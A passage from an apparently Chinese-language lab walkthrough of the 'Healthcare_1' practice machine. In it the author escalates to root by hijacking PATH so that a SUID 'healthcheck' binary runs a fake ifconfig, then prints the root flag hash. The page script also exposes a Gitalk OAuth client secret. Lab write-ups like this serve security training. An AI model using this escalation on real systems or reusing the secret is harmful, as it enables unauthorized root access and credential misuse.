<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">[medical@localhost default]$ find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>147863   12 -rwsr-xr-x   1 root     root         9564 Sep  3  2011 /usr/libexec/pt_chown<br>147695  236 -rws--x--x   1 root     root       238352 Sep  8  2011 /usr/lib/ssh/ssh-keysign<br>145819    8 -rwsr-xr-x   1 root     polkituser     5748 Apr  5  2010 /usr/lib/polkit-resolve-exe-helper<br>145811   12 -rwsr-xr-x   1 root     root         9108 Aug 29  2011 /usr/lib/polkit-1/polkit-agent-helper-1<br>139126   12 -rwsr-xr-x   1 root     root         9940 Nov  2  2011 /usr/lib/chromium-browser/chrome-sandbox<br>145817    8 -rwsr-xr--   1 root     polkituser     7580 Apr  5  2010 /usr/lib/polkit-grant-helper-pam<br>145821   16 -rwsr-xr-x   1 polkituser root        16356 Apr  5  2010 /usr/lib/polkit-set-default-helper<br>147975   12 -rwsr-xr-x   1 root     root        10757 Jun 11  2011 /usr/sbin/fileshareset<br>148146   12 -rwsr-xr-x   1 root     root        12036 Nov 28  2010 /usr/sbin/traceroute6<br>148168   12 -rwsr-xr-x   1 root     root        10713 Aug  2  2011 /usr/sbin/usernetctl<br>148166   36 -rwsr-xr-x   1 root     root        33324 Nov  9  2009 /usr/sbin/userhelper<br>136381   40 -rwsr-sr-x   1 root     root        39020 Jun 26  2011 /usr/bin/crontab<br>136286   44 -rwsr-sr-x   1 daemon   daemon      41036 Jan 19  2010 /usr/bin/at<br>137295   32 -rwsr-xr-x   1 root     root        28916 Dec 28  2010 /usr/bin/pumount<br>136305    4 -rwsr-sr-x   1 daemon   daemon        137 Jan 19  2010 /usr/bin/batch<br>136529   16 -rwsr-xr-x   1 root     root        15848 Jan  9  2010 /usr/bin/expiry<br>137125   32 -rws--x--x   1 root     root        28752 Jan  9  2010 /usr/bin/newgrp<br>137230   20 -rwsr-xr-x   1 root     root        16920 Aug 29  2011 /usr/bin/pkexec<br>137590  120 -rwsr-xr-x   1 root     root       122188 Nov 28  2010 /usr/bin/wvdial<br>137249   40 -rwsr-xr-x   1 root     root        39488 Dec 28  2010 /usr/bin/pmount<br>137440   64 -rws--x--x   1 root     root        63752 Jan 23  2010 /usr/bin/sperl5.10.1<br>136717  364 -rwsr-xr-x   1 root     root       370648 Jan 18  2011 /usr/bin/gpgsm<br>136708   56 -rwsr-xr-x   1 root     root        56100 Jan  9  2010 /usr/bin/gpasswd<br>136347   16 -rws--x--x   1 root     root        12400 Nov 16  2010 /usr/bin/chfn<br>137462   32 -r-sr-xr-x   1 root     root        31144 Nov 16  2010 /usr/bin/su<br>137181   24 -r-s--x--x   1 root     shadow      20512 Jan 30  2010 /usr/bin/passwd<br>136709  936 -rwsr-xr-x   1 root     root       956252 Oct 18  2010 /usr/bin/gpg<br>132151    8 -rwsr-sr-x   1 root     root         5813 Jul 29  2020 /usr/bin/healthcheck<br>136247    8 -rwsr-xr-x   1 root     root         5852 Sep 22  2011 /usr/bin/Xwrapper<br>137222   36 -rwsr-xr-x   1 root     root        35128 Nov 28  2010 /usr/bin/ping6<br>136351   12 -rws--x--x   1 root     root        11664 Nov 16  2010 /usr/bin/chsh<br>   172  308 -rwsr-x---   1 root     messagebus   314400 Sep 29  2011 /lib/dbus-1/dbus-daemon-launch-helper<br>136122   12 -rwsr-xr-x   1 root     root        11114 Jul  6  2011 /sbin/pam_timestamp_check<br>   123   36 -rwsr-xr-x   1 root     root        34848 Nov 28  2010 /bin/ping<br>    83   28 -rwsr-xr-x   1 root     root        26360 Oct 18  2011 /bin/fusermount<br>   144   32 -rwsr-xr-x   1 root     root        31144 Nov 16  2010 /bin/su<br>   111   80 -rwsr-xr-x   1 root     root        80748 Nov 16  2010 /bin/mount<br>   152   32 -rwsr-xr-x   1 root     root        31180 Nov 16  2010 /bin/umount<br></code></pre></td></tr></table></figure>

<p>看到一个有意思的文件 <code>/usr/bin/healthcheck</code></p>
<p>看一看权限</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[medical@localhost default]$ <span class="hljs-built_in">ls</span> -liah /usr/bin/healthcheck<br><span class="hljs-built_in">ls</span> -liah /usr/bin/healthcheck<br>132151 -rwsr-sr-x 1 root root 5.7K Jul 29  2020 /usr/bin/healthcheck<br></code></pre></td></tr></table></figure>

<p>没法修改，尝试看看可读字符</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">[medical@localhost default]$ strings /usr/bin/healthcheck<br>strings /usr/bin/healthcheck<br>/lib/ld-linux.so.2<br>__gmon_start__<br>libc.so.6<br>_IO_stdin_used<br>setuid<br>system<br>setgid<br>__libc_start_main<br>GLIBC_2.0<br>PTRhp<br>[^_]<br>clear ; <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;System Health Check&#x27;</span> ; <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&#x27;</span> ; <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;Scanning System&#x27;</span> ; <span class="hljs-built_in">sleep</span> 2 ; ifconfig ; fdisk -l ; <span class="hljs-built_in">du</span> -h<br></code></pre></td></tr></table></figure>

<p>ifconfig 没有用绝对目录，开始尝试环境变量提权</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">[medical@localhost default]$ <span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br>/sbin:/usr/sbin:/bin:/usr/bin:/usr/lib/qt4/bin<br>[medical@localhost default]$ <span class="hljs-built_in">cd</span> /tmp<br><span class="hljs-built_in">cd</span> /tmp<br>[medical@localhost tmp]$ <span class="hljs-built_in">export</span> PATH=.:<span class="hljs-variable">$PATH</span><br><span class="hljs-built_in">export</span> PATH=.:<span class="hljs-variable">$PATH</span><br>[medical@localhost tmp]$ <span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br>.:/sbin:/usr/sbin:/bin:/usr/bin:/usr/lib/qt4/bin<br>[medical@localhost tmp]$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/bash&quot;</span> &gt; ifconfig<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/bash&quot;</span> &gt; ifconfig<br>[medical@localhost tmp]$ <span class="hljs-built_in">chmod</span> +x ifconfig<br><span class="hljs-built_in">chmod</span> +x ifconfig<br>[medical@localhost tmp]$ <span class="hljs-built_in">ls</span> -laih<br><span class="hljs-built_in">ls</span> -laih<br>total 3.7M<br>393986 drwxrwxrwt  6 root     root     4.0K Aug 12 16:23 ./<br>     2 drwxr-xr-x 21 root     root     4.0K Aug 11 18:28 ../<br>417152 drwxrwxrwt  2 root     root     4.0K Aug 11 18:28 .ICE-unix/<br>420761 -r--r--r--  1 root     root       11 Aug 11 18:28 .X0-lock<br>420762 drwxrwxrwt  2 root     root     4.0K Aug 11 18:28 .X11-unix/<br>424825 -rw-r--r--  1 root     root     1.7K Aug 11 18:28 ddebug.log<br>424987 drwx------  2 medical  medical  4.0K Aug 12 15:52 gpg-1hljcK/<br>423301 drwx------  2 almirant almirant 4.0K Jul 29  2020 gpg-ycbRQr/<br>428578 -rwxr-xr-x  1 medical  medical    10 Aug 12 16:23 ifconfig*<br>425007 -rw-------  1 root     root        0 Jul 29  2020 init.vQ5ZLd<br>428666 -rw-r--r--  1 apache   apache   3.7M Jul 29  2020 setup_dump.sql<br>[medical@localhost tmp]$ /usr/bin/healthcheck<br>/usr/bin/healthcheck<br>TERM environment variable not <span class="hljs-built_in">set</span>.<br>System Health Check<br><br>Scanning System<br>[root@localhost tmp]<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>

<p>提权成功</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@localhost tmp]<span class="hljs-comment"># whoami</span><br><span class="hljs-built_in">whoami</span><br>root<br>[root@localhost tmp]<span class="hljs-comment"># id</span><br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root),7(lp),19(floppy),22(cdrom),80(cdwriter),81(audio),82(video),83(dialout),100(<span class="hljs-built_in">users</span>),490(polkituser),500(medical),501(fuse)<br>[root@localhost tmp]<span class="hljs-comment"># cd /root</span><br><span class="hljs-built_in">cd</span> /root<br>[root@localhost root]<span class="hljs-comment"># ls -alih</span><br><span class="hljs-built_in">ls</span> -alih<br>total 920K<br>393987 drwxr-x--- 20 root root 4.0K Jul 29  2020 ./<br>     2 drwxr-xr-x 21 root root 4.0K Aug 11 18:28 ../<br>411838 -rw-------  1 root root    0 Sep 11  2011 .ICEauthority<br>428659 -rw-------  1 root root  426 Jul 29  2020 .bash_history<br>411839 -rw-r--r--  1 root root  193 Sep 24  2011 .bash_profile<br>411840 -rw-rw-rw-  1 root root  422 Sep  6  2011 .bashrc<br>411841 drwxr-xr-x  2 root root 4.0K Sep 12  2011 .cache/<br>411843 drwx------  6 root root 4.0K Sep 12  2011 .config/<br>411855 drwx------  3 root root 4.0K Jul 19  2011 .dbus/<br>411858 -rw-------  1 root root   28 Jul 22  2011 .dmrc<br>411859 drwx------  4 root root 4.0K Sep 24  2011 .gconf/<br>411979 drwx------  2 root root 4.0K Sep 24  2011 .gconfd/<br>411981 drwx------  3 root root 4.0K Sep 12  2011 .gnome2/<br>411983 drwx------  2 root root 4.0K Sep 12  2011 .gnome2_private/<br>411835 drwx------  3 root root 4.0K Jul 29  2020 .gnupg/<br>411984 drwx------  2 root root 4.0K Jul 19  2011 .gvfs/<br>411985 drwx------  3 root root 4.0K Sep  6  2011 .<span class="hljs-built_in">local</span>/<br>411995 drwx------  3 root root 4.0K Nov  5  2011 .mc/<br>411999 -rw-r--r--  1 root root    0 Oct 22  2010 .mdk-menu-migrated<br>412000 -rw-r--r--  1 root root    0 Jul 21  2011 .menu-updates.stamp<br>428664 -rw-------  1 root root    6 Jul 29  2020 .mysql_history<br>412001 drwx------  2 root root 4.0K Nov  5  2011 .synaptic/<br>412006 drwx------  2 root root 4.0K Sep 11  2011 .thumbnails/<br>412007 drwxr-xr-x  2 root root 4.0K Jul 29  2020 .xauth/<br>412008 -rw-r--r--  1 root root 1.9K Jul  6  2011 .xbindkeysrc<br>412009 drwxr--r--  2 root root 4.0K Jul 19  2011 Desktop/<br>412010 drwx------  3 root root 4.0K Sep  8  2011 Documents/<br>393989 drwx------  2 root root 4.0K Sep  6  2011 drakx/<br>430643 -rwxr-xr-x  1 root root 5.7K Jul 29  2020 healthcheck*<br>430637 -rw-r--r--  1 root root  182 Jul 29  2020 healthcheck.c<br>428662 -rw-rw-rw-  1 root root 2.1K Jul 29  2020 root.txt<br>430635 -rw-r--r--  1 root root 797K Apr 12  2020 sudo.rpm<br>393988 drwx------  2 root root 4.0K Aug 11 18:28 tmp/<br>[root@localhost root]<span class="hljs-comment"># cat root.txt</span><br><span class="hljs-built_in">cat</span> root.txt<br>██    ██  ██████  ██    ██     ████████ ██████  ██ ███████ ██████      ██   ██  █████  ██████  ██████  ███████ ██████  ██ <br> ██  ██  ██    ██ ██    ██        ██    ██   ██ ██ ██      ██   ██     ██   ██ ██   ██ ██   ██ ██   ██ ██      ██   ██ ██ <br>  ████   ██    ██ ██    ██        ██    ██████  ██ █████   ██   ██     ███████ ███████ ██████  ██   ██ █████   ██████  ██ <br>   ██    ██    ██ ██    ██        ██    ██   ██ ██ ██      ██   ██     ██   ██ ██   ██ ██   ██ ██   ██ ██      ██   ██    <br>   ██     ██████   ██████         ██    ██   ██ ██ ███████ ██████      ██   ██ ██   ██ ██   ██ ██████  ███████ ██   ██ ██ <br>                                                                                                                          <br>                                                                                                                          <br>Thanks <span class="hljs-keyword">for</span> Playing!<br><br>Follow me at: http://v1n1v131r4.com<br><br><br>root <span class="hljs-built_in">hash</span>: eaff25eaa9ffc8b62e3dfebf70e83a7b<br></code></pre></td></tr></table></figure>
                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/knowledge-database/" class="category-chain-item">knowledge_database</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>Healthcare_1 靶机</div>
      <div>https://i3eg1nner.github.io/2023/08/c7207977b36b.html</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>I3eg1nner</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2023年8月11日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2023/08/5d3dbe7ff791.html" title="sunset_dawn 靶机">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">sunset_dawn 靶机</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2023/08/47a5f7d3b51c.html" title="chili_1 靶机">
                        <span class="hidden-mobile">chili_1 靶机</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      
  <div id="gitalk-container"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#gitalk-container', function() {
      Fluid.utils.createCssLink('/css/gitalk.css')
      Fluid.utils.createScript('https://lib.baomitu.com/gitalk/1.8.0/gitalk.min.js', function() {
        var options = Object.assign(
          {"clientID":"a14e9a13405642f51885","clientSecret":"5662f466deab58fdbbacd0ae3718eaf1625401dd","repo":"gitalk","owner":"I3eg1nner","admin":["I3eg1nner"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
          {
            id: '887148ee95f6270f3738de168602f722'
          }
        )
        var gitalk = new Gitalk(options);
        gitalk.render('gitalk-container');
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
